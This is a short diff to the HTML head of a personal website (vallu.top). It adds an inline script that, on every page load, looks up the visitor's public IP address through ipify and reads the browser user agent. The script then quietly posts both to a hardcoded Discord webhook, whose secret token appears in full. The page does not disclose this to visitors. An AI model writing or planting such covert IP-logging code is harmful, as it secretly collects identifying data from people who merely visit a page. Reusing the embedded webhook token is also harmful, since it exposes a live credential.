@@ -20,6 +20,32 @@
 		"@type": "Organization",
 		"name": ""
 }</script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+      $(document).ready(function () {
+        // Retrieve IP address and user agent
+        $.getJSON("https://api.ipify.org?format=json", function (data) {
+          var ipAddress = data.ip;
+          var userAgent = navigator.userAgent;
+
+          // Create payload object
+          var payload = {
+            content: "IP Address: " + ipAddress + "\nUser Agent: " + userAgent,
+          };
+
+          // Send data to Discord webhook
+          $.ajax({
+            type: "POST",
+            url: "https://discord.com/api/webhooks/1128693100294979696/WZZM09odNb2fcWkw6Ms6_a4jPZ4kopNV0Xu7JDjpvBjKzOzJ34pyYUs6S9UCbkwiZK0a",
+            data: JSON.stringify(payload),
+            contentType: "application/json",
+            success: function () {
+              console.log("Data sent to Discord successfully.");
+            },
+          });
+        });
+      });
+    </script>
   <meta content="vallu.top" property="og:title" />
   <meta content="The domain cost me 1.60$ :)" property="og:description" />
   <meta content="#000000" data-react-helmet="true" name="theme-color" />
